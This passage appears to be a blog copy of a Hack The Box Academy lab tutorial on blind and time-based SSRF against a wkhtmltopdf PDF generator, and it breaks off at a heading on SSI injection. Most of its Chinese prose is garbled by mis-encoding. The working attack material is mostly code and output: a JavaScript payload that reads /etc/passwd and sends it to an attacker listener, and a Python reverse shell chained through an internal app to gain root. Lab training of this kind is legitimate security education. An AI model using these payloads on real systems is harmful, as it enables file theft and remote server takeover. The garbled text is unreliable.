<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ rce</span><br><span class="line"># uname -a; hostname; whoami</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami</span><br><span class="line">&lt;/h1&gt;&lt;a&gt;Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux</span><br><span class="line">a054d48cc0a4</span><br><span class="line">root</span><br><span class="line"> &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h2><p>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´å¯èƒ½æ˜¯â€œç›²ç›®çš„â€ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œå³ä½¿è¯·æ±‚è¢«å¤„ç†ï¼Œæˆ‘ä»¬ä¹Ÿçœ‹ä¸åˆ°åç«¯æœåŠ¡å™¨çš„å“åº”ã€‚å› æ­¤ï¼ŒSSRFç›²æ¼æ´æ›´éš¾ä»¥æ£€æµ‹å’Œåˆ©ç”¨ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¸¦å¤–æŠ€æœ¯æ£€æµ‹SSRFç›²æ¼æ´ï¼Œä½¿æœåŠ¡å™¨å‘æˆ‘ä»¬æ§åˆ¶ä¸‹çš„å¤–éƒ¨æœåŠ¡å‘å‡ºè¯·æ±‚ã€‚ä¸ºäº†æ£€æµ‹åç«¯æœåŠ¡æ˜¯å¦æ­£åœ¨å¤„ç†æˆ‘ä»¬çš„è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…·æœ‰æˆ‘ä»¬æ‹¥æœ‰çš„å…¬å…±IPåœ°å€çš„æœåŠ¡å™¨æˆ–ä»¥ä¸‹æœåŠ¡ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>ï¼ˆBurp Suite Professionalçš„ä¸€éƒ¨åˆ†ã€‚ç¤¾åŒºç‰ˆä¸­ä¸æä¾›ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://pingb.in/">http://pingb.in</a></li>
</ul>
<p>Blind SSRFæ¼æ´å¯èƒ½å­˜åœ¨äºPDFæ–‡æ¡£ç”Ÿæˆå™¨å’ŒHTTPæ ‡å¤´ç­‰ä½ç½®ã€‚</p>
<h2 id="Blind-SSRF-Exploitation-Example"><a href="#Blind-SSRF-Exploitation-Example" class="headerlink" title="Blind SSRF Exploitation Example"></a>Blind SSRF Exploitation Example</h2><p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬åˆ©ç”¨Webåº”ç”¨ç¨‹åºä¸­çš„SSRFç›²æ¼æ´ï¼Œè¯¥åº”ç”¨ç¨‹åºæ¥æ”¶HTMLæ–‡ä»¶å¹¶è¿”å›PDFæ–‡æ¡£ã€‚è¿™ä¸ªWebåº”ç”¨ç¨‹åºæ˜¯æˆ‘ä»¬å¯ä»¥åœ¨æœ¬èŠ‚æœ«å°¾çš„ç»ƒä¹ ä¸­ç”Ÿæˆçš„ç›®æ ‡ã€‚</p>
<p>å¯¼èˆªåˆ°æœ¬èŠ‚çš„ç»“å°¾å¹¶å•å‡»<code>Click here to spawn the target system!</code>ï¼Œç„¶åä½¿ç”¨æä¾›çš„Pwnboxæˆ–å…·æœ‰æä¾›çš„VPNå¯†é’¥çš„æœ¬åœ°VMæµè§ˆç›®æ ‡åº”ç”¨ç¨‹åºå¹¶æ²¿ç€ã€‚åº”ç”¨ç¨‹åºæ­£åœ¨ä¾¦å¬ç«¯å£8080ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind1_.png" alt="image"></p>
<p>å¦‚æœæˆ‘ä»¬ä¸Šä¼ å„ç§HTMLæ–‡ä»¶å¹¶æ£€æŸ¥å“åº”ï¼Œæˆ‘ä»¬ä¼šæ³¨æ„åˆ°åº”ç”¨ç¨‹åºè¿”å›ç›¸åŒçš„å“åº”ï¼Œè€Œä¸ç®¡æäº¤æ–‡ä»¶çš„ç»“æ„å’Œå†…å®¹å¦‚ä½•ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æ— æ³•è§‚å¯Ÿåˆ°ä¸å‰ç«¯å¤„ç†æäº¤çš„HTMLæ–‡ä»¶ç›¸å…³çš„ä»»ä½•å“åº”ã€‚æˆ‘ä»¬æ˜¯å¦åº”è¯¥å¾—å‡ºç»“è®ºï¼Œåº”ç”¨ç¨‹åºä¸å®¹æ˜“å—åˆ°SSRFçš„æ”»å‡»ï¼Ÿå½“ç„¶ä¸æ˜¯ï¼æˆ‘ä»¬åº”è¯¥åœ¨æ¸—é€æµ‹è¯•æœŸé—´è¿›è¡Œå½»åº•çš„æµ‹è¯•ï¼Œå¹¶å¯»æ‰¾ä¸åŒæ¼æ´ç±»åˆ«çš„ç›²ç›®å¯¹åº”ç‰©ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/response_blind1_.png" alt="image"></p>
<p>è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªHTMLæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæŒ‡å‘æˆ‘ä»¬æ§åˆ¶ä¸‹çš„æœåŠ¡çš„é“¾æ¥ï¼Œä»¥æµ‹è¯•åº”ç”¨ç¨‹åºæ˜¯å¦å®¹æ˜“å—åˆ°SSRFç›²æ¼æ´çš„æ”»å‡»ã€‚æ­¤æœåŠ¡å¯ä»¥æ˜¯æˆ‘ä»¬æ‹¥æœ‰çš„æœºå™¨ä¸­æ‰˜ç®¡çš„WebæœåŠ¡å™¨ã€Burp Collaboratorã€Pingb.in URLç­‰ã€‚è¯·æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨å¸¦å¤–æŠ€æœ¯æ—¶å¯ä»¥ä½¿ç”¨çš„åè®®åŒ…æ‹¬HTTPã€DNSã€FTPç­‰ã€‚</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://&lt;SERVICE IP&gt;:PORT/x?=viaimgtag"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å°†ç”¨äºæµ‹è¯•SSRFç›²æ¼æ´çš„æœåŠ¡å°†æ˜¯åœ¨Pwnboxæˆ–æœ¬åœ°VMä¸­è¿è¡Œå¹¶åœ¨ç«¯å£9090ä¸Šä¾¦å¬çš„ç®€å•Netcatä¾¦å¬å™¨ã€‚å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯æœ¬åœ°VMï¼Œè¯·è®°ä½ä½¿ç”¨æä¾›çš„VPNå¯†é’¥ã€‚å› æ­¤ï¼Œåœ¨ä¸Šé¢çš„HTMLæ–‡ä»¶ä¸­ï¼Œ<code>SERVICE IP</code>åº”è¯¥æ˜¯Pwnboxæˆ–æœ¬åœ°VMçš„<code>VPN/TUN IP</code>ï¼Œ<code>PORT</code>åº”è¯¥æ˜¯<code>9090</code>ã€‚</p>
<h4 id="Netcat-Listener-1"><a href="#Netcat-Listener-1" class="headerlink" title="Netcat Listener"></a>Netcat Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo nc -nlvp 9090</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 9090</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_server__.png" alt="image"></p>
<p>æäº¤æ–‡ä»¶åï¼Œæˆ‘ä»¬å°†åœ¨æµè§ˆå™¨ä¸­æ”¶åˆ°æ¥è‡ªWebåº”ç”¨ç¨‹åºçš„æ¶ˆæ¯ï¼Œå¹¶å‘æˆ‘ä»¬çš„æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œæ˜¾ç¤ºç”¨äºå°†HTMLæ–‡æ¡£è½¬æ¢ä¸ºPDFçš„åº”ç”¨ç¨‹åºã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_payload_.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind2__.png" alt="image"></p>
<p>é€šè¿‡æ£€æŸ¥è¯·æ±‚ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°User-Agentä¸­çš„<code>wkhtmltopdf</code>ã€‚å¦‚æœæˆ‘ä»¬æµè§ˆ<a target="_blank" rel="noopener" href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdfçš„ä¸‹è½½ç½‘é¡µ</a>ï¼Œä¸‹é¢çš„å£°æ˜å¼•èµ·äº†æˆ‘ä»¬çš„æ³¨æ„ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Do not use wkhtmltopdf with any untrusted HTML â€“ be sure to  sanitize any user-supplied HTML/JS; otherwise, it can lead to the  complete takeover of the server it is running on! Please read the  project status for the gory details.</span><br></pre></td></tr></tbody></table></figure>

<p>å¾ˆå¥½ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨wkhtmltopdfä¸­æ‰§è¡ŒJavaScriptï¼è®©æˆ‘ä»¬é€šè¿‡åˆ›å»ºä»¥ä¸‹HTMLæ–‡æ¡£æ¥åˆ©ç”¨æ­¤åŠŸèƒ½è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Exfiltration via Blind SSRF<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> readfile = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// Read the local file</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> exfil = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// Send the file to our server</span></span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="title function_">open</span>(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>, <span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (readfile.<span class="property">readyState</span> === <span class="number">4</span>) {</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> url = <span class="string">'http://&lt;SERVICE IP&gt;:&lt;PORT&gt;/?data='</span>+<span class="title function_">btoa</span>(<span class="variable language_">this</span>.<span class="property">response</span>);</span></span><br><span class="line"><span class="language-javascript">                exfil.<span class="title function_">open</span>(<span class="string">"GET"</span>, url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                exfil.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>){<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">'&lt;a&gt;Oops!&lt;/a&gt;'</span>);}</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">ä¸ªXMLHttpRequest</a>å¯¹è±¡ï¼Œä¸€ä¸ªç”¨äºé˜…è¯»æœ¬åœ°æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªç”¨äºå°†å…¶å‘é€åˆ°æœåŠ¡å™¨ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>btoa</code>å‡½æ•°æ¥å‘é€ä»¥Base64ç¼–ç çš„æ•°æ®ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_payload_2.png" alt="image"></p>
<p>è®©æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œæäº¤æ–°çš„HTMLæ–‡ä»¶ï¼Œç­‰å¾…å“åº”ï¼Œå¹¶åœ¨å¤„ç†å®ŒHTMLæ–‡ä»¶åå¯¹å…¶å†…å®¹è¿›è¡Œè§£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<h4 id="Netcat-Listener-2"><a href="#Netcat-Listener-2" class="headerlink" title="Netcat Listener"></a>Netcat Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo nc -nlvp 9090</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 9090</span><br><span class="line">GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1</span><br><span class="line">Origin: file://</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Language: en,*</span><br><span class="line">Host: 10.10.14.221:9090</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_server__2.png" alt="image"></p>
<h4 id="Base64-Decoding"><a href="#Base64-Decoding" class="headerlink" title="Base64 Decoding"></a>Base64 Decoding</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ echo """cm9vdDp4OjA6MDpyb290Oi9yb&lt;SNIP&gt;""" | base64 -d</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡SSRFåˆ©ç”¨äº†ä¸€ä¸ªå†…éƒ¨åº”ç”¨ç¨‹åºï¼Œå¹¶åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œäº†è¿œç¨‹å‘½ä»¤ã€‚å½“å‰åœºæ™¯ä¸­å­˜åœ¨ç›¸åŒçš„å†…éƒ¨åº”ç”¨ç¨‹åºï¼ˆ<code>internal.app.local</code>ï¼‰ã€‚è®©æˆ‘ä»¬å¯¹åº•å±‚æœåŠ¡å™¨è¿›è¡Œå¦¥åï¼Œä½†è¿™æ¬¡æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æœ‰æ•ˆè´Ÿè½½çš„HTMLæ–‡æ¡£æ¥åˆ©ç”¨æœ¬åœ°åº”ç”¨ç¨‹åºä¾¦å¬internal.app.localã€‚</p>
<p>æˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹åå‘shellè´Ÿè½½ï¼ˆä¸€æ—¦å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå°±å¾ˆå®¹æ˜“è¯†åˆ«Pythonæ˜¯å¦å®‰è£…ï¼‰ã€‚</p>
<h4 id="Bash-Reverse-Shell"><a href="#Bash-Reverse-Shell" class="headerlink" title="Bash Reverse Shell"></a>Bash Reverse Shell</h4><p>Code: éªŒè¯ç ï¼š bash</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=<span class="string">"&lt;VPN/TUN IP&gt;"</span>;<span class="built_in">export</span> RPORT=<span class="string">"&lt;PORT&gt;"</span>;python -c <span class="string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span></span><br></pre></td></tr></tbody></table></figure>

<p>è¯·è®°ä½ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡ŒURLç¼–ç ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å®ƒè¿›è¡Œä¸¤æ¬¡ç¼–ç ã€‚æœ€ç»ˆç»“æœå°†ç±»ä¼¼äºä¸‹é¢ã€‚</p>
<h4 id="URL-Encoded-Payload"><a href="#URL-Encoded-Payload" class="headerlink" title="URL Encoded Payload"></a>URL Encoded Payload</h4><p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªHTMLæ–‡ä»¶ï¼Œå®ƒå¯¹internal.app.localæ‰§è¡ŒGETè¯·æ±‚ï¼Œåˆ°è¾¾æ˜“å—SSRFè¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»çš„æœ¬åœ°åº”ç”¨ç¨‹åºï¼Œå¹¶æ‰§è¡Œæˆ‘ä»¬çš„åå‘shellã€‚</p>
<h4 id="HTML-Payload"><a href="#HTML-Payload" class="headerlink" title="HTML Payload"></a>HTML Payload</h4><p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Reverse Shell via Blind SSRF<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> http = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        http.<span class="title function_">open</span>(<span class="string">"GET"</span>,<span class="string">"http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527"</span>, <span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">        http.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        http.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>){<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">'&lt;a&gt;Oops!&lt;/a&gt;'</span>);}</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>ä¸€æ—¦æˆ‘ä»¬åœ¨æœºå™¨ä¸Šå¯åŠ¨Netcatä¾¦å¬å™¨å¹¶æäº¤ä¸Šé¢çš„HTMLæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±ä¼šæ”¶åˆ°æ¥è‡ª<code>internal.app.local</code>çš„åå‘shellã€‚      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ nc -nvlp 9090</span><br><span class="line"></span><br><span class="line">listening on [any] 9090 ...</span><br><span class="line">Connection received on 10.129.201.238 33100</span><br><span class="line"></span><br><span class="line"># whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Time-Based-SSRF"><a href="#Time-Based-SSRF" class="headerlink" title="Time-Based SSRF"></a>Time-Based SSRF</h2><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è§‚å¯Ÿå“åº”çš„æ—¶é—´å·®å¼‚æ¥ç¡®å®šSSRFæ¼æ´çš„å­˜åœ¨ã€‚æ­¤æ–¹æ³•è¿˜æœ‰åŠ©äºå‘ç°å†…éƒ¨æœåŠ¡ã€‚</p>
<p>è®©æˆ‘ä»¬å°†ä¸‹é¢çš„æ–‡æ¡£æäº¤åˆ°ä¸Šä¸€èŠ‚çš„PDFåº”ç”¨ç¨‹åºï¼Œå¹¶è§‚å¯Ÿå“åº”æ—¶é—´ã€‚</p>
<p>Code: éªŒè¯ç ï¼š htmlHTML</p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Time-Based Blind SSRF<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://blah.nonexistent.com"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind_time.png" alt="image"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡èŠ±äº†10ç§’æ¥å“åº”è¯·æ±‚ã€‚å¦‚æœæˆ‘ä»¬åœ¨HTMLæ–‡æ¡£ä¸­æäº¤ä¸€ä¸ªæœ‰æ•ˆçš„URLï¼Œå“åº”æ—¶é—´ä¼šæ›´çŸ­ã€‚è¯·è®°ä½<code>internal.app.local</code>æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å†…éƒ¨åº”ç”¨ç¨‹åºï¼ˆæˆ‘ä»¬å¯ä»¥åœ¨ä¸Šä¸€èŠ‚ä¸­é€šè¿‡SSRFè®¿é—®ï¼‰ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind_time2.png" alt="image"></p>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½ä¼šç«‹å³å¤±è´¥ï¼Œè€Œä¸æ˜¯èŠ±æ›´å¤šçš„æ—¶é—´æ¥å“åº”ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä»”ç»†è§‚å¯Ÿè¯·æ±‚ä¹‹é—´çš„æ—¶é—´å·®ã€‚</p>
<h1 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h1><h2 id="Server-Side-Includes-Overview"><a href="#Server-Side-Includes-Overview" class="headerlink" title="Server-Side Includes Overview"></a>Server-Side Includes Overview</h2><p>æœåŠ¡å™¨ç«¯åŒ…å«ï¼ˆ<code>SSI</code>ï¼‰æ˜¯Webåº”ç”¨ç¨‹åºä½¿ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œç”¨äºåœ¨åŠ è½½ä¹‹å‰æˆ–æ¸²æŸ“è¿‡ç¨‹ä¸­é€šè¿‡è¯„ä¼°SSIæŒ‡ä»¤åœ¨HTMLé¡µé¢ä¸Šåˆ›å»ºåŠ¨æ€å†…å®¹ã€‚ä¸€äº›SSIæŒ‡ä»¤æ˜¯ï¼š</p>
<p>Code: </p>
